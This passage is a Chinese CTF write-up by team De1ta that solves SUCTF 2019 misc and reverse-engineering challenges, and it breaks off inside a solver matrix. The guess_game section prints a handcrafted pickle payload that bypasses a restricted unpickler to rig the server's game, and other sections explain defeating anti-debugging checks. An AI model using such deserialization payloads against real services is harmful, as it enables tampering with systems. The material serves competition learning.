<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<blockquote>
<p>Team: De1ta</p>
</blockquote>
<p>前排广告位：De1ta长期招 逆向/pwn/密码学/硬件/取证/杂项/etc. 选手，急招二进制和密码选手,有意向的大佬请联系<code>ZGUxdGFAcHJvdG9ubWFpbC5jb20=</code></p>
<h1 data-content="1" id="cef024ab21f76403cc2589cacf1d9eba">Misc</h1>
<h2 data-content="1" id="040e6482474a8479fa9600cf30cdb1ee">签到</h2>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64decode</span>
<span class="n">a</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s2">"1.txt"</span><span class="p">,</span><span class="s2">"r"</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
<span class="n">c</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s2">"1.png"</span><span class="p">,</span><span class="s2">"wb"</span><span class="p">)</span>
<span class="n">c</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">b64decode</span><span class="p">(</span><span class="n">a</span><span class="p">))</span>
<span class="n">c</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819100803-2d7608bc-c226-1.png"/></p>
<h2 data-content="1" id="369962cf8f6e7d97891895ef708aa455">guess_game</h2>
<p>一个猜数字游戏，题目提供了客户端和服务端。这个游戏有10轮，每轮猜0-10共11个数字，10轮全部猜中才出flag，直接碰撞不可能。</p>
<p>这题主要考察对 <code>pickle</code> 序列化的了解，读懂 <code>pickle</code> 的源代码，手工构造出相应 <code>payload</code> 即可。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819170520-78b9243c-c260-1.png"/></p>
<p><code>RestrictedUnpickler.py</code> 里重写了 <code>find_class</code>，对反序列化的对象位置进行了限制，只允许 <code>guess_game</code> 下的模块，而且不允许含 <code>__</code> 的内置对象。</p>
<p>那么可以先反序列化一个 <code>guess_game里的game对象</code>，然后再反序列化一个 <code>guess_game.Ticket里的Ticket类</code>，参数 <code>number</code> 随便赋一个值（比如6），然后将 <code>Ticket</code> 赋值给 <code>game的curr_ticket</code> 覆盖服务端随机生成的 <code>Ticket</code>，最后我们再反序列化一次最开始反序列化的 <code>Ticket</code>，参数 <code>number</code> 赋相同值。</p>
<p>将以上反序列化过程，对照 <code>pickle</code> 源代码构造好一条语句，直接循环10次打过去，就能拿到flag。</p>
<p>构造好的 <code>payload</code>：</p>
<pre><code>ticket = b"\x80\x04cguess_game\ngame\nN(S'curr_ticket'\ncguess_game.Ticket\nTicket\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00numberq\x03K\x06sbd\x86bcguess_game.Ticket\nTicket\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00numberq\x03K\x06sb."</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819170524-7b05b41c-c260-1.png"/></p>
<p>Flag: <code>flag{cabe5968-8143-4c45-91b7-557edab2ab4d}</code></p>
<h2 data-content="1" id="0ebbdeb7b016d325b643659d6c2f2de2">game</h2>
<p>index.html里有一句话：<code>can u find my secret</code>?<br/>
在两个js文件里搜，找到一个图片文件名：<code>iZwz9i9xnerwj6o7h40eauZ.png</code>，下下来，用Stegsolver看一下LSB，发现有一串字符：<code>U2FsdGVkX1+zHjSBeYPtWQVSwXzcVFZLu6Qm0To/KeuHg8vKAxFrVQ==</code>，根据U2FsdGVkX1猜测是密文，试了一下，3DES，密钥是index.html中的字符串<code>ON2WG5DGPNUECSDBNBQV6RTBNMZV6RRRMFTX2===</code>的b32decode，解开可得flag</p>
<blockquote>
<p>flag: <code>suctf{U_F0und_1t}</code></p>
</blockquote>
<h2 data-content="1" id="ea8d0845069751a0f9593ef085d5b0df">protocol</h2>
<p>简单看一下流量包，发现有很多png，foremost提取出来，图片有两种，一种是一个字符的镜面图片，另一种是空白图片，并且每隔15张字符图片后有10张空白图片。重新审计流量包，发现传输每张图片的流量的数据部分第3个字节有一定的变化规律，遂将该字节相同的空白图片与字符图片一一对应，即得flag。</p>
<blockquote>
<p>flag: <code>suctf{My_usb_pr0toco1_s0_w3ak}</code></p>
</blockquote>
<h2 data-content="1" id="f07a3b7868883cdce60f16edfda7f953">homerouter</h2>
<p>先试着用binwalk提取下发的路由器固件，能看到文件：</p>
<p><img src="https://chikorita.fun/ctf_writeup/suctf_2019/img/HOMEROUTER_3.png"/></p>
<p>这个时候能看到有个那么不常见的东西：</p>
<p><img src="https://chikorita.fun/ctf_writeup/suctf_2019/img/HOMEROUTER_4.png"/></p>
<p>能看到配置文件里有个不寻常的东西：</p>
<p><img src="https://chikorita.fun/ctf_writeup/suctf_2019/img/HOMEROUTER_5.png"/></p>
<blockquote>
<p>EasyCwmp is a GPLv2 open source implementation of the TR069 cwmp standard.</p>
</blockquote>
<p>这个时候就大概能猜想要去利用easycwmp来连接一下服务器看看会有什么。可以选择用qemu来跑固件，比较省事。还有个比较不那么靠谱的方法就是用Burp一类的工具模拟协议发包和服务器交互了。</p>
<p>有关更多信息，可以查看这里或者Google。</p>
<p><a href="https://www.twblogs.net/a/5b7f63712b717767c6af5969" target="_blank">TR069之CPE與ACS的Digest驗證</a></p>
<p><a href="https://blog.csdn.net/Lock_Love_/article/details/48713243" target="_blank">TR-069 协议完整的通信过程</a></p>
<p>由于这边不知道为啥qemu有点问题跑不起来，于是乎拿了一个路由器和一个软路由试了一下，下面都记录了。比赛的时候是用的一台平时折腾用的Phicomm K2，之前刷了PandoraBox，于是直接SSH上去。</p>
<h3 data-content="1" id="809a046ce48449849c019139b8264aac">使用PandoraBox</h3>
<p>由于PandoraBox有预编译的包，所以可以直接：</p>
<div class="highlight"><pre><span></span>opkg update
opkg install easycwmp
</pre></div>
<p>然后编辑<code>/etc/config/easycwmp</code>里的acs相关的配置。串号随意改一个就好了。</p>
<p>这个时候如果尝试直接跑<code>easycwmp -f -b</code>的话可能会没有反应就退出了，好像是因为这里的easycwmp自己已经启动了。只好<code>ps</code>看一下进程，然后把它<code>kill</code>掉。</p>
<p>这个时候应该能正常用了，不过我这边没有输出，像卡住了一样，搜了一下发现应该去看syslog。于是先开着：</p>
<div class="highlight"><pre><span></span>logread -f
</pre></div>
<p>然后改了个串号再开<code>easycwmp -f -b</code>。如果发现日志里出现<code>Error reading ca cert file</code>的话，可以：</p>
<div class="highlight"><pre><span></span>opkg install ca-bundle
</pre></div>
<p>然后重试上面的步骤。如果<code>/usr/share/easycwmp/functions</code>下的文件里有<code>system_set_password root</code>的话（没有的话就去把固件里的<code>/usr/share/easycwmp/functions/system</code>复制一份过来），应该能在日志里读到：（就是下发配置修改root密码）</p>
<p><img src="https://chikorita.fun/ctf_writeup/suctf_2019/img/HOMEROUTER_6.png"/></p>
<p>最后...接下来你可能会因为接下来登录不了SSH和LuCI而怀疑人生，不要慌，因为它帮你把密码设置成了flag...</p>
<h3 data-content="1" id="e365a6ea8b361ab4673f26e18b37f394">使用OpenWRT软路由</h3>
<p>这个只要搞个虚拟机就可以跑，比较简单。没有的话可以先下载一下镜像：<a href="https://downloads.openwrt.org/snapshots/targets/x86/64/" target="_blank">Index of /snapshots/targets/x86/64/</a>。（其实也可以玩玩Koolshare的LEDE）</p>
<p>具体安装方法可以看这里：<a href="https://openwrt.org/docs/guide-user/virtualization/virtualbox-vm" target="_blank">Run OpenWrt as a VirtualBox virtual machine</a>。</p>
<p>主要就是解压，然后转盘：</p>
<div class="highlight"><pre><span></span>VBoxManage convertfromraw --format VDI openwrt-x86-64-combined-squashfs.img openwrt-x86-64-combined-squashfs.vdi
</pre></div>
<pre><code>'C:\Program Files\Oracle\VirtualBox\VBoxManage.exe' convertfromraw --format VDI openwrt-x86-64-combined-squashfs.img openwrt-x86-64-combined-squashfs.vdi</code></pre>
<p>然后VirtualBox新建虚拟机，使用已存在的虚拟硬盘文件即可。启动前需要保证网卡1是仅主机（Host-only）适配器，网卡2是NAT，不然可能上不了网。（Koolshare的好像不大一样，自己看文档吧）</p>
<p>要是启动后网络还是有问题就：</p>
<div class="highlight"><pre><span></span>uci show network
</pre></div>
<p>看一下。可以：</p>
<div class="highlight"><pre><span></span>uci <span class="nb">set</span> network.lan.ipaddr<span class="o">=</span><span class="s1">'192.168.56.2'</span>
uci commit
reboot
</pre></div>
<p>把不对的改掉。</p>
<p>然后就可以来装easycwmpd了。现在没有预编译的包了，只好自己编译。</p>
<p><a href="https://chikorita.fun/ctf_writeup/suctf_2019/files/homerouter/x86_64/easycwmp_1.8.1_x86_64.ipk" target="_blank">x86_64/easycwmp_1.8.1</a></p>
<p><a href="https://chikorita.fun/ctf_writeup/suctf_2019/files/homerouter/x86_64/libmicroxml_2015_03_18_caa8d3e68.ipk" target="_blank">x86_64/libmicroxml</a></p>
<p><a href="https://chikorita.fun/ctf_writeup/suctf_2019/files/homerouter/i386/easycwmp_1.8.1_i386_pentium4.ipk" target="_blank">i386/easycwmp_1.8.1</a></p>
<p><a href="https://chikorita.fun/ctf_writeup/suctf_2019/files/homerouter/i386/libmicroxml_2015_03_18_caa8d3e68.ipk" target="_blank">i386/libmicroxml</a></p>
<p>这里贴一下自己编译的，可以直接下载对应架构的，然后：</p>
<div class="highlight"><pre><span></span>opkg install xxx.ipk
</pre></div>
<p>非要自己编译的话就看着<a href="https://github.com/pivasoftware/easycwmp" target="_blank">这里（pivasoftware/easycwmp）</a>的README编译吧。需要先<code>git clone https://github.com/openwrt/openwrt</code>，然后把<a href="http://easycwmp.org/download/easycwmp-openwrt-1.8.1.tar.gz" target="_blank">easycwmp-openwrt</a>和<a href="http://easycwmp.org/download/libmicroxml.tar.gz" target="_blank">microxml</a>的压缩包解压到<code>openwrt/package</code>下，这个时候在<code>openwrt</code>目录下执行：</p>
<div class="highlight"><pre><span></span>make menuconfig
</pre></div>
<p>应该就能在Utilities里找到easycwmpd了。根据自己的需要进行<code>make</code>即可。</p>
<p>安装完成后的操作就和在PandoraBox下差不多了，就是改配置，然后读日志，再启动客户端就好了。</p>
<p><img src="https://chikorita.fun/ctf_writeup/suctf_2019/img/HOMEROUTER_7.png"/></p>
<h1 data-content="1" id="9f4f9ee5162f0450d8c36f52b44cd97c">RE</h1>
<h2 data-content="1" id="9f534150744a5fbe50da97a80e75179f">signup</h2>
<p>gmp库计算RSA</p>
<p>直接在factordb分解N</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">inverse</span>
<span class="n">p</span> <span class="o">=</span> <span class="mi">282164587459512124844245113950593348271</span>
<span class="n">q</span> <span class="o">=</span> <span class="mi">366669102002966856876605669837014229419</span>
<span class="n">n</span> <span class="o">=</span> <span class="n">p</span><span class="o">*</span><span class="n">q</span>
<span class="n">phi</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">q</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
<span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>
<span class="n">d</span> <span class="o">=</span> <span class="n">inverse</span><span class="p">(</span><span class="n">e</span><span class="p">,</span><span class="n">phi</span><span class="p">)</span>
<span class="n">c</span> <span class="o">=</span> <span class="mh">0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35</span>
<span class="n">m</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">n</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">m</span><span class="p">)[</span><span class="mi">2</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">"hex"</span><span class="p">))</span>
</pre></div>
<h2 data-content="1" id="adaffaa5f6e06be00fe98f570103c99d">hardcpp</h2>
<p>用ollvm混淆过的c++代码。</p>
<p>开头给了一个类似哈希的东西，先不管。</p>
<p>ollvm中应该开了运算混淆，流程平坦化和一些虚假分支，调试一下发现主要流程就在那一堆lamda那里。</p>
<p>输入一共21位长度，从下标为1开始加密，和之前一位进行一些四则运算，然后和enc比较，enc一共20位。</p>
<p>这些四则运算都是可逆的，所以知道一位就能求出下一位，只需要爆破下标为0的字符，即可求出flag</p>
<div class="highlight"><pre><span></span><span class="n">enc</span> <span class="o">=</span> <span class="p">[</span>  <span class="mh">0xF3</span><span class="p">,</span> <span class="mh">0x2E</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0xE1</span><span class="p">,</span> <span class="mh">0x4C</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0xD1</span><span class="p">,</span> <span class="mh">0xF9</span><span class="p">,</span> <span class="mh">0x8C</span><span class="p">,</span>
  <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0xF4</span><span class="p">,</span> <span class="mh">0x0E</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0xA3</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x0E</span><span class="p">,</span> <span class="mh">0xA5</span><span class="p">]</span>

<span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
    <span class="n">a</span> <span class="o">=</span> <span class="p">[</span><span class="n">j</span><span class="p">]</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">20</span><span class="p">):</span>
        <span class="n">a</span><span class="o">.</span><span class="n">append</span><span class="p">(((</span><span class="n">enc</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="p">((</span><span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">^</span><span class="mi">18</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="o">+</span><span class="mi">2</span><span class="p">))</span><span class="o">-</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">%</span><span class="mi">7</span><span class="p">))</span><span class="o">&amp;</span><span class="mh">0xff</span><span class="p">)</span>
    <span class="n">s</span> <span class="o">=</span> <span class="s2">""</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">chr</span><span class="p">,</span><span class="n">a</span><span class="p">))</span>
    <span class="k">if</span> <span class="s2">"flag"</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
</pre></div>
<p>查一下md5发现是井号，也就是第一个字符。</p>
<h2 data-content="1" id="a30e26f05eca2d0769be41587a35d5ea">Akira Homework</h2>
<p>程序有多处反调试，以及多处check，通过这些check会还原一个dll，后面多线程会进入这个dll最终到一段aes的逻辑得到flag。</p>
<p>程序中的字符串都被某一个字符异或加密了，所以搜不到字符串，但是可以对key数组查找引用找到所有加密的字符串。</p>
<p>做法以调试为主，先把地址随机化关掉，然后在所有Isdebuggerpresent和exit处下断点查看，基本遇到的反调试直接nop/jmp掉</p>
<p>开始的tls回调函数会解密四个字符串NtQueryInformationProcess，ZwQueryInformationThread，NtQueueApcThread和ntdll.dll。查找这些字符串的引用可以在后面看到用GetProcAdreee获取这些函数地址。但是使用ida调试的时候，tls回调函数被多次调用了，可能是后面多线程的关系，导致这些字符串被重复加密，到最后就没被还原去使用了，所以在这里打断点，第一次停下的时候执行解密，之后每次停下都直接set ip到最后ret</p>
<p>main函数逻辑较为简单：开头起了多线程，先看主线程的逻辑：</p>
<p>先输入一串passwd，经过一串简单的加密，解密出来是</p>
<pre><code>Akira_aut0_ch3ss_!</code></pre>
<p>之后第二个check会获取当前目录，在后面加一个:signature后打开，比如<code>/WinRev.exe:signature</code>，从中获取内容并md5校验。md5解出来是<code>Overwatch</code>问了下队里师傅，冒号说是文件流，可以通过以下指令写入：</p>
<pre><code>type 1.txt &gt;&gt; WinRev.exe:signature</code></pre>
<p>1.txt中放要写入的内容。把"Overwatch"字符串写入后就能通过check。</p>
<p>注意到两个check通过后都会调用<code>sub_140006C10</code>函数，里面调用了某个函数，下断跟进后发现是这两个函数</p>
<p><code>sub_140008910</code>和<code>sub_1400089E0</code>他们对全局变量<code>unk_1400111A0</code>进行了解密，然后SetEvent一个Handles变量，这个变量一共又三个。通过查找他的交叉引用以及<code>sub_140006C10</code>函数的引用，发现在开头起的多线程里面<code>sub_140008B20</code>又被调用了。简</p>
<p>单分析下这个函数，发现这里md5了什么东西并和一些md5值校验，相等则直接exit。这里可以猜到md5的可能是进程名，如果有ida.exe等进程则退出，通过下断点调试也能发现，在退出时可以看到md5的内容是ida64.exe。通过进程名校验后会调用<code>sub_140006C10</code>解密。判定了一个全局变量，所以只会解密一次。</p>
<p>全部通过这三个校验并完成，会看到解密完的结果有pe头。dump出来是个dll</p>
<p>之后main函数就没啥用了，sleep挂起。为了方便调试，可以修改sleep的时间，调大一些。</p>
<p>接下来主要是另一个线程中干的事了。分析beginthreadex的起始函数，注意到里面有个<code>sub_140009850</code>中信息很多。发现了DllInput以及校验了MZ字符。开头他在等待三个Handles设定完毕。但进入这个函数的条件<code>byte_140016198</code>一直没找到在哪设置。分析<code>sub_140008D20</code>函数，他会调用参数一函数指针，查找这个全局变量的引用，看到它是在<code>sub_140009C20</code>中被设置，同样的还有<code>qword_140016178</code>和<code>qword_140016180</code>，他们最终被<code>sub_140008850</code>设置成一开始tls回调函数解密的NtQueryInformationProcess，ZwQueryInformationThread和NtQueueApcThread，当他们都被成功设置后，就能成功进入<code>sub_140009850</code>的逻辑了。</p>
<p>如果wait到一个258的信号，会提示time out并推出，所以之前sleep要改长一点。</p>
<p>单步调试发现到<code>sub_140007D80</code>里面会获取输入，逐步f8跟进最终来到<code>sub_180002880</code>是最后的逻辑：</p>
<div class="highlight"><pre><span></span><span class="kr">__int64</span> <span class="nf">sub_180002880</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kr">__int64</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// rax</span>
  <span class="kr">__int64</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+0h] [rbp-B8h]</span>
  <span class="kr">__int64</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-98h]</span>
  <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+30h] [rbp-88h]</span>
  <span class="kr">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [rsp+38h] [rbp-80h]</span>
  <span class="kr">__int64</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [rsp+40h] [rbp-78h]</span>
  <span class="kr">__int64</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// [rsp+48h] [rbp-70h]</span>
  <span class="kt">char</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// [rsp+50h] [rbp-68h]</span>
  <span class="kt">char</span> <span class="n">v9</span><span class="p">;</span> <span class="c1">// [rsp+68h] [rbp-50h]</span>
  <span class="kt">char</span> <span class="n">v10</span><span class="p">;</span> <span class="c1">// [rsp+80h] [rbp-38h]</span>
  <span class="kr">__int64</span> <span class="n">v11</span><span class="p">;</span> <span class="c1">// [rsp+90h] [rbp-28h]</span>

  <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v8</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x11u</span><span class="n">i64</span><span class="p">);</span>
  <span class="n">ucrtbase_puts</span><span class="p">(</span><span class="s">"Now check the sign:"</span><span class="p">);</span>
  <span class="n">sub_1800027A0</span><span class="p">(</span><span class="s">"%32s"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v8</span><span class="p">);</span>
  <span class="n">v5</span> <span class="o">=</span> <span class="n">kernel32_OpenEventW</span><span class="p">(</span><span class="mi">2031619</span><span class="n">i64</span><span class="p">,</span> <span class="mi">1</span><span class="n">i64</span><span class="p">,</span> <span class="sa">L</span><span class="s">"DLLInput"</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v5</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">kernel32_WaitForSingleObject</span><span class="p">(</span><span class="n">v5</span><span class="p">,</span> <span class="mh">0xFFFFFFFF</span><span class="n">i64</span><span class="p">);</span>
    <span class="n">kernel32_CloseHandle</span><span class="p">(</span><span class="n">v5</span><span class="p">);</span>
    <span class="n">v4</span> <span class="o">=</span> <span class="n">kernel32_OpenFileMappingW</span><span class="p">(</span><span class="mi">983071</span><span class="n">i64</span><span class="p">,</span> <span class="mi">0</span><span class="n">i64</span><span class="p">,</span> <span class="sa">L</span><span class="s">"ShareMemory"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">v3</span> <span class="o">=</span> <span class="mh">0x8000</span><span class="n">i64</span><span class="p">;</span>
      <span class="n">kernel32_MapViewOfFile</span><span class="p">();</span>
      <span class="n">v7</span> <span class="o">=</span> <span class="n">v0</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">v0</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="n">kernel32_CloseHandle</span><span class="p">(</span><span class="n">v4</span><span class="p">);</span>
        <span class="n">v6</span> <span class="o">=</span> <span class="n">ucrtbase_malloc</span><span class="p">(</span><span class="mh">0x8000</span><span class="n">i64</span><span class="p">);</span>
        <span class="n">vcruntime140_memset</span><span class="p">(</span><span class="n">v6</span><span class="p">,</span> <span class="mi">0</span><span class="n">i64</span><span class="p">,</span> <span class="mh">0x8000</span><span class="n">i64</span><span class="p">);</span>
        <span class="n">vcruntime140_memcpy</span><span class="p">(</span><span class="n">v6</span><span class="p">,</span> <span class="n">v7</span><span class="p">,</span> <span class="mh">0x8000</span><span class="n">i64</span><span class="p">);</span>
        <span class="n">strcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v10</span><span class="p">,</span> <span class="s">"Ak1i3aS3cre7K3y"</span><span class="p">);</span>
        <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v9</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x11u</span><span class="n">i64</span><span class="p">);</span>
        <span class="n">sub_180002800</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v10</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v9</span><span class="p">,</span> <span class="n">v6</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">ucrtbase_strcmp</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v9</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v8</span><span class="p">)</span> <span class="p">)</span>
          <span class="n">sub_1800026F0</span><span class="p">(</span><span class="s">"wow... game start!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">else</span>
          <span class="n">sub_1800026F0</span><span class="p">(</span><span class="s">"Get finally answer!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="k">else</span>
      <span class="p">{</span>
        <span class="n">kernel32_CloseHandle</span><span class="p">(</span><span class="n">v4</span><span class="p">);</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">sub_180002AB0</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kr">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v2</span> <span class="o">^</span> <span class="n">v11</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
<p>其中<code>sub_180002800</code>很容易看出是aes，密文是之前另一个线程里面看起来很像密文的东西，key就在这里。由于这里获取输入后直接跟解密后的明文比较，所以不需要自己解密，在strcmp下断点就能看到flag了：</p>
<pre><code>flag{Ak1rAWin!}</code></pre>
<h2 data-content="1" id="ab66ccf9127489265ff5edf4357a9268">babyunic</h2>
<p>使用unicorn引擎，翻一下unicorn源码可以得知几个函数及参数的意思</p>
<p><a href="https://github.com/unicorn-engine/unicorn/blob/master/include/unicorn/unicorn.h" target="_blank">https://github.com/unicorn-engine/unicorn/blob/master/include/unicorn/unicorn.h</a></p>
<p><a href="https://github.com/unicorn-engine/unicorn/blob/master/include/unicorn/mips.h" target="_blank">https://github.com/unicorn-engine/unicorn/blob/master/include/unicorn/mips.h</a></p>
<p>可以得知架构是mips，大端序</p>
<p>输入的flag与结果分别被写到两个地址，分别作为指针通过a0和a1传入，然后设置了fp和sp的值。代码写到另一个地址，然后开始执行。最后从结果处读数据与常量对比。</p>
<p>ida自带有mips大端序处理器模块，使用retdec插件可以反编译，但是效果不是很好。</p>
<p>不过代码逻辑特别简单，很容易能看懂。</p>
<p>先是循环左移三位，然后异或下标，最后互相加减计算出42个结果。</p>
<p>因此只需解42元方程组。</p>
<p>编写脚本提取出方程组：</p>
<pre><code>bg = 0x00000378
end = 0x00007058
addr = bg

def next_instr(addr):
    return addr+ItemSize(addr)
counter = 0
counter_c = 1

while(addr&lt;end):
    counter = 0
    print "flag[0]",
    while(True):
        next = next_instr(addr)
        mnem = GetMnem(addr)

        if 'addiu' in mnem:
            counter+=1
        elif 'addu' in mnem:
            print "+ flag[%d]"%counter,
        elif "subu" in mnem:
            print "- flag[%d]"%counter,
        if "sw" in GetDisasm(addr):
            print("== cipher[%d]"%counter_c)
            addr = next
            addr = next_instr(addr)
            addr = next_instr(addr)
            break
        addr = next
    counter_c+=1</code></pre>
<p>然后用文本操作提取出矩阵，解出flag</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">numpy</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">unpack</span>
<span class="n">A</span> <span class="o">=</span> <span class="n">mat</span><span class="p">([[</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">],</span>
<span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span 